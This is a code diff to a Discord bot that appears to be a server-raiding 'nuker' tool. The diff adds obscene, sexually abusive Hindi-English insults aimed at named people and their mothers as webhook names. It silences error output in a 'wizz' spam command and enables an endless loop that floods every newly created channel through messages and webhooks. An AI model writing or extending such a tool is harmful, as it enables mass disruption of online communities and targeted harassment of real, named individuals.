@@ -15,7 +15,22 @@ MESSAGE_CONTENTS = ["@everyone @here rounak teri maa ke gile bhosde se nikle hue
 
 WEBHOOK_NAMES = ["Love from Ankush & Paracetamol",
 "Sher ki ma ki chut me loda",
-"Nikhil's mom fucked up"]
+"Nikhil's mom fucked up",
+"Sher mere lode pe",
+"Nafisa ki chut me lund",
+"Nikhil madharchod",
+"Nikhil randi ka bacha",
+"Nikhil mere sperm ka",
+"Nikhil made with ankush's sperm",
+"Nikhil ki mummu randi",
+"Rounak mere lode pe",
+"Rounak ki gand daily maarta hu mai"
+"Lr mere lode pe",
+"Nikhil ki ma mere lode pe",
+"A",
+"B",
+"c",
+"d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
 
 client.remove_command('help')
 
@@ -133,7 +148,8 @@ async def wizz(ctx, amount=50):
           await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
           print(f"{channel.name} spammed")
         except:
-          print(f"{channel.name} not spammed")
+          pass
+          
     for member in ctx.guild.members:
       if member.id != 860039451895005265:  
         try:
@@ -147,7 +163,7 @@ async def wizz(ctx, amount=50):
 async def on_guild_channel_create(channel):
   webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
   while True:  
-    #await channel.send(random.choice(MESSAGE_CONTENTS))
+    await channel.send(random.choice(MESSAGE_CONTENTS))
     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
 
 @client.command("kick")
